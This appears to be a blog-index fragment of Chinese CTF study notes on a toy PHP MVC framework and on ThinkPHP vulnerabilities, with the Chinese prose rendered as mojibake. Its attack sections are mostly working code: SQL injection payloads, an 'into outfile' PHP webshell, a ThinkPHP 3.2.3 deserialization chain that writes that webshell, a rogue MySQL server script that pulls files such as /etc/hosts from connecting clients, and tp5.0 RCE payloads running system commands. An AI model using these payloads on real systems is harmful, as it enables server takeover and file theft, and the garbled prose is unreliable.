ç»„æˆçš„ç•Œé¢\næ˜¾ç¤ºæ•°æ®ç”±è§†å›¾è´Ÿè´£\nmodel(æ¨¡å‹)è¡¨ç¤ºä¸šåŠ¡è§„åˆ™, åœ¨MVCä¸‰ä¸ªéƒ¨ä»¶ä¸­, æ¨¡å‹æ‹¥æœ‰æœ€å¤šçš„å¤„ç†ä»»åŠ¡. è¢«æ¨¡å‹è¿”å›çš„æ•°æ®æ˜¯ä¸­ç«‹çš„, æ¨¡å‹ä¸æ•°æ®æ ¼å¼æ— å…³, è¿™æ ·ä¸€ä¸ªæ¨¡å‹èƒ½ä¸ºå¤šä¸ªè§†å›¾æä¾›æ•°æ®, ç”±äºåº”ç”¨äºæ¨¡å‹çš„ä»£ç åªéœ€å†™ä¸€æ¬¡å°±å¯ä»¥è¢«å¤šä¸ªè§†å›¾ä½¿ç”¨, æ‰€ä»¥å‡å°‘äº†ä»£ç çš„é‡å¤æ€§\næ•°æ®è¯»å–ä¸å­˜å‚¨æ˜¯ç”±æ¨¡å‹è´Ÿè´£çš„\ncontroller(æ§åˆ¶å™¨)æ˜¯æŒ‡æ¥æ”¶ç”¨æˆ·è¾“å…¥å¹¶è°ƒç”¨æ¨¡å‹å’Œè§†å›¾å»å®Œæˆç”¨æˆ·çš„éœ€æ±‚, æ§åˆ¶å™¨æœ¬èº«ä¸è¾“å‡ºä»»ä½•ä¸œè¥¿å’Œåšä»»ä½•å¤„ç†, å®ƒåªæ˜¯æ¥æ”¶è¯·æ±‚å¹¶å†³å®šè°ƒç”¨å“ªä¸ªæ¨¡å‹æ„ä»¶å»å¤„ç†è¯·æ±‚, ç„¶åå†ç¡®å®šç”¨å“ªä¸ªè§†å›¾æ¥æ˜¾ç¤ºè¿”å›çš„æ•°æ®\nè‡ªå·±å†™ä¸€ä¸ªPHPæ¡†æ¶é¦–å…ˆç¡®å®šä¸€ä¸‹æ¡†æ¶çš„ä¸»è¦åŠŸèƒ½\n\nåŸºäºpathinfoä¸‹çš„è·¯ç”±ç›‘å¬\nä¸šåŠ¡åˆ†å±‚, å®ç°ç®€å•çš„mvc\næ¸²æŸ“å¼•æ“\næ§åˆ¶å™¨\næ•°æ®å¤„ç†\n\né¦–å…ˆå†™ä¸€ä¸ªindex.php\n&lt;?phpecho &quot;i am admin controller&lt;br&gt;&quot;;class admin&#123;    function login($username,$password)&#123;        if($username==&#x27;admin&#x27;&amp;&amp;$password==&#x27;admin&#x27;)&#123;            echo &quot;ç™»é™†æˆåŠŸ&quot;;        &#125;else&#123;            echo &quot;ç™»å½•å¤±è´¥&quot;;        &#125;    &#125;    function logout()&#123;        echo &quot;i am logout function&quot;;    &#125;    static function getInstance()&#123;        return new admin();    &#125;\n\nç„¶åæ–°å»ºä¸€ä¸ªcontrollerç›®å½•\n//admin.php&lt;?phpecho &quot;i am admin controller&lt;br&gt;&quot;;class admin&#123;    function login($username,$password)&#123;        if($username==&#x27;admin&#x27;&amp;&amp;$password==&#x27;admin&#x27;)&#123;            echo &quot;ç™»é™†æˆåŠŸ&quot;;        &#125;else&#123;            echo &quot;ç™»å½•å¤±è´¥&quot;;        &#125;    &#125;    function logout()&#123;        echo &quot;i am logout function&quot;;    &#125;    static function getInstance()&#123;        return new admin();    &#125;&#125;\n\n//user.php&lt;?phpecho &quot;i am user controller&quot;;\n\næœ€ç»ˆæ•ˆæœ:\n\nç¬¬äºŒèŠ‚ thinkphpæ¼æ´0x1 thinkphpæ¡†æ¶ä¸‹çš„ä¿¡æ¯æ”¶é›† è¿™é‡Œæˆ‘ä»¬ä¸‹è½½ä¸€ä¸ªthinkphpçš„3.2.3ç‰ˆæœ¬çš„æºç \nå¯»æ‰¾tpæ¡†æ¶çš„ç‰¹å¾urlä¸­å¯»æ‰¾ç‰¹å¾thinkphpæ¡†æ¶ä¸‹çš„urlä¸€èˆ¬æ˜¯index.php/home/index/indexç±»å‹, ä¸ªåˆ«ä¼šçœç•¥æ‰index.php, ç›´æ¥æ˜¯/home/index/index,è¿™æ—¶å€™æˆ‘ä»¬çœ‹åˆ°çš„æ˜¯ä¸‰å±‚pathinfoç»“æ„, å°±è¦è€ƒè™‘æ˜¯thinkphpæ¡†æ¶\nè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æ¨¡å—æˆ–è€…æ§åˆ¶å™¨çš„åå­—, æ£€æŸ¥æŠ¥é”™ä¿¡æ¯, è®¿é—®http://localhost/index.php/home/charmersix/index\nå¯ä»¥çœ‹åˆ°æŠ¥é”™ä¿¡æ¯çš„è¯å°±å¯ä»¥ç²¾ç¡®æ‰¾åˆ°thinkphpçš„ç‰ˆæœ¬å·äº†\næŠ¥é”™å…³é—­çš„æƒ…å†µé€šè¿‡å¯¹thinkphp uiçš„æ•æ„Ÿå°±å¯ä»¥ä¸€çœ¼é¡¶é’ˆ, çœ‹å‡ºå…¶æ¡†æ¶\nä½¿ç”¨è½¯è·¯ç”±æ£€æµ‹è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡getæ–¹å¼æäº¤pathinfoçš„å€¼, è¿™é‡Œä¾æ—§å¯ä»¥é€šè¿‡ä¿®æ”¹æ§åˆ¶å™¨/æ–¹æ³•åæ¥çœ‹æŠ¥é”™ä¿¡æ¯\ntpçš„ä»£ç æ‰§è¡Œshowå‚æ•°å¯æ§ä¸‹çš„ä»£ç æ‰§è¡Œå‡è®¾æˆ‘ä»¬æœ‰è¿™æ ·çš„ä»£ç \n&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller&#123;    public function index($n=&#x27;&#x27;)&#123;        $this-&gt;show(&#x27;$n&#x27;);    &#125;&#125;\n\nå¯ä»¥ç›´æ¥æ¸²æŸ“æˆ‘ä»¬æäº¤çš„nå‚æ•°\nè¿™é‡Œæˆ‘ä»¬ç›´æ¥å†™phpä»£ç åˆ©ç”¨å°±å¯ä»¥\nåˆ©ç”¨æ—¥å¿—æ–‡ä»¶ä»£ç æ‰§è¡Œåœ¨thinkphpå¼€å¯debugçš„æƒ…å†µä¸‹ä¼šåœ¨runtimeç›®å½•ä¸‹ç”Ÿæˆlogæ–‡ä»¶, æ–‡ä»¶çš„åç§°æ˜¯ä»¥å¹´_æœˆ_æ—¥.logæ¥å‘½åçš„, æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çˆ†ç ´æ–‡ä»¶å\nurl/Application/Runtime/Logs/Home/y_m_d.log\nè¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥æŠ“åŒ…é€šè¿‡bpå»çˆ†ç ´éšè—ä¿¡æ¯\næˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°è¿™æ ·ä¸€æ¡æ¥å£\næ‰§è¡Œä»£ç è·å¾—flagå³å¯\ntpçš„SQLæ³¨å…¥æ¼æ´åœ¨ä¸€åˆ‡å¼€å§‹ä¹‹å‰, æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹æˆ‘ä»¬å½“å‰ç‰ˆæœ¬thinkphpçš„å®˜æ–¹æ–‡æ¡£, åœ¨è¿™é‡Œ\nåŸºäºwhereçš„SQLæ³¨å…¥æ¼æ´thinkphpSQLæ³¨å…¥åˆ©ç”¨å§¿åŠ¿: whereæ•°ç»„ç»•è¿‡?id[where]=id=1&#39;\nä¾‹å¦‚:?id[where]=id=1 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3, 4 limit 1, 1%23\næ³¨é‡Šå¼•èµ·çš„SQLæ³¨å…¥æ¼æ´ä»£ç å¦‚ä¸‹:\n&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller&#123;    public function index($id=1)&#123;        $user = M(&#x27;users&#x27;)-&gt;comment($id)-&gt;find(intval($id));        $this-&gt;show(&#x27;&lt;p&gt;hello &#x27;.$user[&#x27;username&#x27;].&#x27;&lt;/p&gt;&#x27;,&#x27;utf-8&#x27;);    &#125;&#125;\n\nåœ¨è¿™ä¸ªæ¡†æ¶ä¸­, commentå°†ä¼šè¢«/**/åŒ…è£¹æ³¨é‡Šæ‰, ä½†æ˜¯, æˆ‘ä»¬å¯ä»¥è¾“å…¥*/å°†æ³¨é‡Šé—­åˆä»è€Œè¾¾åˆ°SQLæ³¨å…¥, ä½†æ˜¯è¿™é‡Œæˆ‘ä»¬ä¼šå‘ç°unionè”åˆæ³¨å…¥æ˜¯ä¸èƒ½ç”¨çš„, å› ä¸ºåœ¨limitå, unionæ˜¯ä¸å¥½ç”¨çš„\nè¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°ä¸€ä¸ªæ–°å§¿åŠ¿: é€šè¿‡æ•°æ®åº“å†™ä¸€å¥è¯æ–‡ä»¶, ç„¶åè¾¾åˆ°æˆ‘ä»¬æƒ³è¦çš„æ•ˆæœ, ä½†æ˜¯å‰ææ˜¯æ•°æ®åº“å¿…é¡»æ‰“å¼€äº†secure-file-privçš„å†™å…¥æ–‡ä»¶æƒé™\nç„¶åæˆ‘ä»¬ç›´æ¥å†™å…¥ä¸€å¥è¯æœ¨é©¬\nä¾‹å¦‚: ?id=1 */ into outfile &quot;/var/www/html/1.php&quot; lines terminated by &quot;&lt;?php eval($_POST[1])?&gt;&quot;;%23\n\næœ¨é©¬å·²ç»å†™è¿›å», ç›´æ¥åˆ©ç”¨å³å¯\n\nç¬¬ä¸‰èŠ‚ thinkphpååºåˆ—åŒ–thinkphpæŒ–é“¾å­åŸºæœ¬æµç¨‹\n1.å¯»æ‰¾å¯åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•, æ¯”è¾ƒå¸¸è§çš„æœ‰__destruct/__wakeup2.ç»§ç»­å¯»æ‰¾è·³æ¿3.æœ€ç»ˆé€šè¿‡å…¶ä»–å‡½æ•°/å…¶ä»–ç±»çš„å±æ€§æ„é€ ä¸€ä¸ªå‡½æ•°åå¯æ§å‡½æ•°å‚æ•°å¯æ§çš„é“¾å­4.å®ç°rce\n\ntp3.2ç‰ˆæœ¬tp3.2.3ç‰ˆæœ¬ä¸‹çš„ååºåˆ—åŒ–æ¼æ´é€šè¿‡ååºåˆ—åŒ–ä¸€ä¸ªæ•°æ®åº“çš„è¿æ¥å¼€å¯ä¸€ä¸ªå †å , æ‰§è¡ŒSQLè¯­å¥, å†™å…¥ä¸€å¥è¯æœ¨é©¬\nè¿™é‡Œæˆ‘ä»¬åªéœ€è¦ç”¨è¿™ä¸ªexpå°±å¯ä»¥ç”Ÿæˆä¸€ä¸²cookie\n&lt;?phpnamespace Think\\Image\\Driver&#123;    use Think\\Session\\Driver\\Memcache;    class Imagick&#123;        private $img;        public function __construct()&#123;            $this-&gt;img=new Memcache();        &#125;    &#125;&#125;namespace Think\\Session\\Driver&#123;    use Think\\Model;    class Memcache &#123;        protected $handle;        public function __construct()&#123;            $this-&gt;handle=new Model();        &#125;&#125;&#125;namespace Think&#123;    use Think\\Db\\Driver\\Mysql;    class Model &#123;        protected $data = array();        protected $db = null;        protected $pk;        public function __construct()&#123;            $this-&gt;db=new Mysql();            $this-&gt;pk=&#x27;id&#x27;;            $this-&gt;data[$this-&gt;pk] = array(                &quot;table&quot; =&gt; &#x27;mysql.user;select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;# &#x27;,                &quot;where&quot; =&gt; &quot;1&quot;            );        &#125;    &#125;&#125;namespace Think\\Db\\Driver&#123;    use PDO;    class Mysql&#123;        protected $options = array(            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true,    // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶            PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true //å¼€å¯å †å ,å‘ç°ä¸åŠ è¿™å¥è¯ä¹Ÿå¯ä»¥        );        protected $config     = array(        &quot;debug&quot;             =&gt;   1,        &#x27;hostname&#x27;          =&gt;  &#x27;127.0.0.1&#x27;, // æœåŠ¡å™¨åœ°å€        &#x27;database&#x27;          =&gt;  &#x27;ctfshow&#x27;,          // æ•°æ®åº“å        &#x27;username&#x27;          =&gt;  &#x27;root&#x27;,      // ç”¨æˆ·å        &#x27;password&#x27;          =&gt;  &#x27;root&#x27;,          // å¯†ç         &#x27;hostport&#x27;          =&gt;  &#x27;3306&#x27;        );                  &#125;&#125;namespace&#123;    use Think\\Image\\Driver\\Imagick;    echo base64_encode(serialize(new Imagick()));&#125;\n\næˆ‘ä»¬è¿è¡Œä¸€ä¸‹è¿™ä¸ªè„šæœ¬å°±å¯ä»¥ç”Ÿæˆä¸€ä¸²base64ç¼–ç , ç„¶åæˆ‘ä»¬æ”¹ä¸€ä¸‹cookieå‘é€å³å¯\nç„¶åå°±å¯ä»¥å†™å…¥ä¸€ä¸ª1.phpçš„ä¸€å¥è¯æœ¨é©¬\n\nå¦‚æœè¿™ä¸ªæ–¹æ³•ä¸è¡Œ, å¯ä»¥ä½¿ç”¨è¿œç¨‹è¯»æ–‡ä»¶çš„å§¿åŠ¿\nä¼ªé€ MySQLæœåŠ¡ç«¯è¯»å–æ–‡ä»¶ä¼ªé€ ä¸€ä¸ªMySQLçš„æœåŠ¡ç«¯, è®©åˆ«äººè¿æ¥çš„æƒ…å†µä¸‹, å¯ä»¥è®©åˆ«äººæŠŠæœ¬åœ°æ–‡ä»¶è¿œç¨‹å‘ç»™æœåŠ¡ç«¯, è¿™é‡Œè™½ç„¶æ˜¯è¯»çš„æœåŠ¡å™¨æ–‡ä»¶, ä½†æ˜¯å…¶å®å°±ç›¸å½“äºæˆ‘ä»¬è¯»çš„è‡ªå·±å®¢æˆ·ç«¯çš„æ–‡ä»¶, å°±ç›¸å½“äºä¸€ä¸ªå˜ç›¸çš„é’“é±¼\nè¿™é‡Œæˆ‘ä»¬è¿˜æ˜¯ç»§ç»­ç”¨ä¸Šè¾¹çš„phpè„šæœ¬+pythonè„šæœ¬, ä½†æ˜¯ä¸Šè¾¹phpè„šæœ¬çš„æœåŠ¡å™¨åœ°å€éœ€è¦æ”¹æˆæˆ‘ä»¬è‡ªå·±çš„äº‘æœåŠ¡å™¨åœ°å€, ç«¯å£ä¹Ÿéœ€è¦æ”¹æˆ3389\nç„¶åæˆ‘ä»¬åœ¨äº‘æœåŠ¡å™¨ä¸Šå¼€å§‹è¿è¡Œè¿™ä¸ªpythonè„šæœ¬, å¼€å§‹ç›‘å¬\nfrom socket import AF_INET, SOCK_STREAM, errorfrom asyncore import dispatcher, loop as _asyLoopfrom asynchat import async_chatfrom struct import Structfrom sys import version_infofrom logging import getLogger, INFO, StreamHandler, Formatter_rouge_mysql_sever_read_file_result = &#123;&#125;_rouge_mysql_server_read_file_end = Falsedef checkVersionPy3():    return not version_info &lt; (3, 0)def rouge_mysql_sever_read_file(fileName, port, showInfo):    if showInfo:        log = getLogger(__name__)        log.setLevel(INFO)        tmp_format = StreamHandler()        tmp_format.setFormatter(Formatter(&quot;%(asctime)s : %(levelname)s : %(message)s&quot;))        log.addHandler(            tmp_format        )    def _infoShow(*args):        if showInfo:            log.info(*args)    # ================================================    # =======No need to change after this lines=======    # ================================================    __author__ = &#x27;Gifts&#x27;    __modify__ = &#x27;Morouu&#x27;    global _rouge_mysql_sever_read_file_result    class _LastPacket(Exception):        pass    class _OutOfOrder(Exception):        pass    class _MysqlPacket(object):        packet_header = Struct(&#x27;&lt;Hbb&#x27;)        packet_header_long = Struct(&#x27;&lt;Hbbb&#x27;)        def __init__(self, packet_type, payload):            if isinstance(packet_type, _MysqlPacket):                self.packet_num = packet_type.packet_num + 1            else:                self.packet_num = packet_type            self.payload = payload        def __str__(self):            payload_len = len(self.payload)            if payload_len &lt; 65536:                header = _MysqlPacket.packet_header.pack(payload_len, 0, self.packet_num)            else:                header = _MysqlPacket.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num)            result = &quot;&quot;.join(                (                    header.decode(&quot;latin1&quot;) if checkVersionPy3() else header,                    self.payload                )            )            return result        def __repr__(self):            return repr(str(self))        @staticmethod        def parse(raw_data):            packet_num = raw_data[0] if checkVersionPy3() else ord(raw_data[0])            payload = raw_data[1:]            return _MysqlPacket(packet_num, payload.decode(&quot;latin1&quot;) if checkVersionPy3() else payload)    class _HttpRequestHandler(async_chat):        def __init__(self, addr):            async_chat.__init__(self, sock=addr[0])            self.addr = addr[1]            self.ibuffer = []            self.set_terminator(3)            self.stateList = [b&quot;LEN&quot;, b&quot;Auth&quot;, b&quot;Data&quot;, b&quot;MoreLength&quot;, b&quot;File&quot;] if checkVersionPy3() else [&quot;LEN&quot;,                                                                                                           &quot;Auth&quot;,                                                                                                           &quot;Data&quot;,                                                                                                           &quot;MoreLength&quot;,                                                                                                           &quot;File&quot;]            self.state = self.stateList[0]            self.sub_state = self.stateList[1]            self.logined = False            self.file = &quot;&quot;            self.push(                _MysqlPacket(                    0,                    &quot;&quot;.join((                        &#x27;\\x0a&#x27;,  # Protocol                        &#x27;5.6.28-0ubuntu0.14.04.1&#x27; + &#x27;\\0&#x27;,                        &#x27;\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&#x27;,                    )))            )            self.order = 1            self.states = [b&#x27;LOGIN&#x27;, b&#x27;CAPS&#x27;, b&#x27;ANY&#x27;] if checkVersionPy3() else [&#x27;LOGIN&#x27;, &#x27;CAPS&#x27;, &#x27;ANY&#x27;]        def push(self, data):            _infoShow(&#x27;Pushed: %r&#x27;, data)            data = str(data)            async_chat.push(self, data.encode(&quot;latin1&quot;) if checkVersionPy3() else data)        def collect_incoming_data(self, data):            _infoShow(&#x27;Data recved: %r&#x27;, data)            self.ibuffer.append(data)        def found_terminator(self):            data = b&quot;&quot;.join(self.ibuffer) if checkVersionPy3() else &quot;&quot;.join(self.ibuffer)            self.ibuffer = []            if self.state == self.stateList[0]:  # LEN                len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1 if checkVersionPy3() else ord(                    data[0]) + 256 * ord(data[1]) + 65536 * ord(data[2]) + 1                if len_bytes &lt; 65536:                    self.set_terminator(len_bytes)                    self.state = self.stateList[2]  # Data                else:                    self.state = self.stateList[3]  # MoreLength            elif self.state == self.stateList[3]:  # MoreLength                if (checkVersionPy3() and data[0] != b&#x27;\\0&#x27;) or data[0] != &#x27;\\0&#x27;:                    self.push(None)                    self.close_when_done()                else:                    self.state = self.stateList[2]  # Data            elif self.state == self.stateList[2]:  # Data                packet = _MysqlPacket.parse(data)                try:                    if self.order != packet.packet_num:                        raise _OutOfOrder()                    else:                        # Fix ?                        self.order = packet.packet_num + 2                    if packet.packet_num == 0:                        if packet.payload[0] == &#x27;\\x03&#x27;:                            _infoShow(&#x27;Query&#x27;)                            self.set_terminator(3)                            self.state = self.stateList[0]  # LEN                            self.sub_state = self.stateList[4]  # File                            self.file = fileName.pop(0)                            # end                            if len(fileName) == 1:                                global _rouge_mysql_server_read_file_end                                _rouge_mysql_server_read_file_end = True                            self.push(_MysqlPacket(                                packet,                                &#x27;\\xFB&#123;0&#125;&#x27;.format(self.file)                            ))                        elif packet.payload[0] == &#x27;\\x1b&#x27;:                            _infoShow(&#x27;SelectDB&#x27;)                            self.push(_MysqlPacket(                                packet,                                &#x27;\\xfe\\x00\\x00\\x02\\x00&#x27;                            ))                            raise _LastPacket()                        elif packet.payload[0] in &#x27;\\x02&#x27;:                            self.push(_MysqlPacket(                                packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27;                            ))                            raise _LastPacket()                        elif packet.payload == &#x27;\\x00\\x01&#x27;:                            self.push(None)                            self.close_when_done()                        else:                            raise ValueError()                    else:                        if self.sub_state == self.stateList[4]:  # File                            _infoShow(&#x27;-- result&#x27;)                            # fileContent                            _infoShow(&#x27;Result: %r&#x27;, data)                            if len(data) == 1:                                self.push(                                    _MysqlPacket(packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27;)                                )                                raise _LastPacket()                            else:                                self.set_terminator(3)                                self.state = self.stateList[0]  # LEN                                self.order = packet.packet_num + 1                            global _rouge_mysql_sever_read_file_result                            _rouge_mysql_sever_read_file_result.update(                                &#123;self.file: data.encode() if not checkVersionPy3() else data&#125;                            )                            # test                            # print(self.file + &quot;:\\n&quot; + content.decode() if checkVersionPy3() else content)                            self.close_when_done()                        elif self.sub_state == self.stateList[1]:  # Auth                            self.push(_MysqlPacket(                                packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27;                            ))                            raise _LastPacket()                        else:                            _infoShow(&#x27;-- else&#x27;)                            raise ValueError(&#x27;Unknown packet&#x27;)                except _LastPacket:                    _infoShow(&#x27;Last packet&#x27;)                    self.state = self.stateList[0]  # LEN                    self.sub_state = None                    self.order = 0                    self.set_terminator(3)                except _OutOfOrder:                    _infoShow(&#x27;Out of order&#x27;)                    self.push(None)                    self.close_when_done()            else:                _infoShow(&#x27;Unknown state&#x27;)                self.push(&#x27;None&#x27;)                self.close_when_done()    class _MysqlListener(dispatcher):        def __init__(self, sock=None):            dispatcher.__init__(self, sock)            if not sock:                self.create_socket(AF_INET, SOCK_STREAM)                self.set_reuse_addr()                try:                    self.bind((&#x27;&#x27;, port))                except error:                    exit()                self.listen(1)        def handle_accept(self):            pair = self.accept()            if pair is not None:                _infoShow(&#x27;Conn from: %r&#x27;, pair[1])                _HttpRequestHandler(pair)                if _rouge_mysql_server_read_file_end:                    self.close()    _MysqlListener()    _asyLoop()    return _rouge_mysql_sever_read_file_resultif __name__ == &#x27;__main__&#x27;:    for name, content in rouge_mysql_sever_read_file(fileName=[&quot;/flag_is_here&quot;, &quot;/etc/hosts&quot;], port=3389,showInfo=True).items():        print(name + &quot;:\\n&quot; + content.decode())\n\ntp5.0ç‰ˆæœ¬æœªå¼€å¯å¼ºåˆ¶è·¯ç”±å¯¼è‡´çš„rceæœ€é«˜ç‰ˆæœ¬æ”¯æŒåˆ°5.0.23\nå¸¸è§payload:\n?s=index/think\\Request/input&amp;filter=system&amp;data=dir?s=index/think\\Request/input&amp;filter[]=system&amp;data=pwd?s=index/think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content&lt;?php phpinfo();?&gt;?s=index/think\\Container/invokefunction&amp;function=call_user_func&amp;vars[]=system&amp;vars[]=dir?s=index/think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami\n\n\nå˜é‡è¦†ç›–å¯¼è‡´çš„rceå‚è€ƒä¾‹å­:\npublic function index($name=&#x27;&#x27;,$from=&#x27;ctfshow&#x27;)&#123;    $this-&gt;assign($name,$from);//æ ‡è®°ä¸€ä¸ªå˜é‡    $this-&gt;display(&#x27;index&#x27;);//æ˜¾ç¤ºindexæ¨¡æ¿&#125;\n\nåœ¨æ‰‹å†Œä¸­, æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™æ ·çš„ä½¿ç”¨æ–¹å¼\n\npayload:\n?name=_content&amp;from=&lt;?php system(&quot;cat /f*&quot;)?&gt;\n\nç›´æ¥è½½å…¥phpæ¨¡æ¿æ‰§è¡Œä»£ç \ntp5.1ç‰ˆæœ¬tp5.1ååºåˆ—åŒ–rceæ¨èæ–‡ç« \n","tags":["Web","Study","unserialize","thinkphp","SQL"]},{"title":"Web_9_PHPä»£ç å®¡è®¡","url":"/2023/03/24/web_9_PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"é¦–å…ˆæ€»ç»“ä¸€ä¸‹ä»£ç å®¡è®¡çš„æ€è·¯\n\n\næ£€æŸ¥æ•æ„Ÿå‡½æ•°çš„å‚æ•°, ç„¶åå›æº¯å˜é‡, åˆ¤æ–­å˜é‡æ˜¯å¦å¯æ§, å¹¶ä¸”æœ‰æ²¡æœ‰ç»è¿‡ä¸¥æ ¼çš„è¿‡æ»¤, è¿™æ˜¯ä¸€ä¸ªé€†å‘è¿½è¸ªçš„è¿‡ç¨‹\næ‰¾å‡ºå“ªäº›æ–‡ä»¶åœ¨æ¥æ”¶å¤–éƒ¨ä¼ å…¥çš„å‚æ•°, ç„¶åè·Ÿè¸ªå˜é‡çš„ä¼ é€’è¿‡ç¨‹, è§‚å¯Ÿæ˜¯å¦æœ‰å˜é‡ä¼ å…¥åˆ°é«˜å±å‡½æ•°é‡Œé¢, æˆ–è€…ä¼ é€’çš„è¿‡ç¨‹æ˜¯å¦æœ‰é€»è¾‘æ¼æ´, è¿™æ˜¯ä¸€ç§æ­£å‘è¿½è¸ªçš„æ–¹å¼\nç›´æ¥æŒ–æ˜åŠŸèƒ½ç‚¹æ¼æ´, æ ¹æ®è‡ªèº«ç»éªŒåˆ¤æ–­è¯¥ç±»åº”ç”¨é€šå¸¸åœ¨å“ªäº›åŠŸèƒ½ä¸­ä¼šå‡ºç°æ¼æ´, ç›´æ¥å…¨ç¯‡é˜…è¯»è¯¥åŠŸèƒ½ä»£ç \né€šç¯‡é˜…è¯»å…¨æ–‡ä»£ç \n\n\näº†è§£ç³»ç»Ÿæ¶æ„å¯¹äºç³»ç»Ÿæ¶æ„, æˆ‘ä»¬åœ¨ç¡®è®¤äº†å®¡è®¡ç›®æ ‡ä¹‹å, åœ¨å®¡è®¡ä¹‹å‰, éœ€è¦å…ˆäº†è§£ç›®æ ‡ç³»ç»Ÿçš„åŸºæœ¬æ¶æ„, æ¯”å¦‚ç›®å½•æƒ…å†µ/æ˜¯å¦ä½¿ç”¨äº†æ¡†æ¶/å­˜åœ¨å“ªäº›è·¯ç”±/æœ‰æ²¡æœ‰å®‰å…¨è¿‡æ»¤å‡½æ•°/æœ‰æ²¡æœ‰å…¨å±€å‚æ•°è¿‡æ»¤; è¿™é‡Œå°±è¦åˆ†ä¸ºæœ‰æ¡†æ¶å’Œæ— æ¡†æ¶æ¥è¿›è¡Œåˆ†æ\nä½¿ç”¨äº†å¼€å‘æ¡†æ¶think PHPä»¥tp5ä¸ºä¾‹, æ¡†æ¶çš„å¤§ä½“ç›®å½•ç»“æ„å¦‚ä¸‹:\nwww  WEBéƒ¨ç½²ç›®å½•ï¼ˆæˆ–è€…å­ç›®å½•ï¼‰â”œâ”€application           åº”ç”¨ç›®å½•â”‚  â”œâ”€common             å…¬å…±æ¨¡å—ç›®å½•ï¼ˆå¯ä»¥æ›´æ”¹ï¼‰â”‚  â”œâ”€module_name        æ¨¡å—ç›®å½•â”‚  â”‚  â”œâ”€config.php      æ¨¡å—é…ç½®æ–‡ä»¶â”‚  â”‚  â”œâ”€common.php      æ¨¡å—å‡½æ•°æ–‡ä»¶â”‚  â”‚  â”œâ”€controller      æ§åˆ¶å™¨ç›®å½•â”‚  â”‚  â”œâ”€model           æ¨¡å‹ç›®å½•â”‚  â”‚  â”œâ”€view            è§†å›¾ç›®å½•â”‚  â”‚  â””â”€ ...            æ›´å¤šç±»åº“ç›®å½•â”‚  â”‚â”‚  â”œâ”€command.php        å‘½ä»¤è¡Œå·¥å…·é…ç½®æ–‡ä»¶â”‚  â”œâ”€common.php         å…¬å…±å‡½æ•°æ–‡ä»¶â”‚  â”œâ”€config.php         å…¬å…±é…ç½®æ–‡ä»¶â”‚  â”œâ”€route.php          è·¯ç”±é…ç½®æ–‡ä»¶â”‚  â”œâ”€tags.php           åº”ç”¨è¡Œä¸ºæ‰©å±•å®šä¹‰æ–‡ä»¶â”‚  â””â”€database.php       æ•°æ®åº“é…ç½®æ–‡ä»¶â”‚â”œâ”€public                WEBç›®å½•ï¼ˆå¯¹å¤–è®¿é—®ç›®å½•ï¼‰â”‚  â”œâ”€index.php          å…¥å£æ–‡ä»¶â”‚  â”œâ”€router.php         å¿«é€Ÿæµ‹è¯•æ–‡ä»¶â”‚  â””â”€.htaccess          ç”¨äºapacheçš„é‡å†™â”‚â”œâ”€thinkphp              æ¡†æ¶ç³»ç»Ÿç›®å½•â”‚  â”œâ”€lang               è¯­è¨€æ–‡ä»¶ç›®å½•â”‚  â”œâ”€library            æ¡†æ¶ç±»åº“ç›®å½•â”‚  â”‚  â”œâ”€think           Thinkç±»åº“åŒ…ç›®å½•â”‚  â”‚  â””â”€traits          ç³»ç»ŸTraitç›®å½•â”‚  â”‚â”‚  â”œâ”€tpl                ç³»ç»Ÿæ¨¡æ¿ç›®å½•â”‚  â”œâ”€base.php           åŸºç¡€å®šä¹‰æ–‡ä»¶â”‚  â”œâ”€console.php        æ§åˆ¶å°å…¥å£æ–‡ä»¶â”‚  â”œâ”€convention.php     æ¡†æ¶æƒ¯ä¾‹é…ç½®æ–‡ä»¶â”‚  â”œâ”€helper.php         åŠ©æ‰‹å‡½æ•°æ–‡ä»¶â”‚  â”œâ”€phpunit.xml        phpunité…ç½®æ–‡ä»¶â”‚  â””â”€start.php          æ¡†æ¶å…¥å£æ–‡ä»¶â”‚â”œâ”€extend                æ‰©å±•ç±»åº“ç›®å½•â”œâ”€runtime               åº”ç”¨çš„è¿è¡Œæ—¶ç›®å½•ï¼ˆå¯å†™ï¼Œå¯å®šåˆ¶ï¼‰â”œâ”€vendor                ç¬¬ä¸‰æ–¹ç±»åº“ç›®å½•ï¼ˆComposerä¾èµ–åº“ï¼‰â”œâ”€build.php             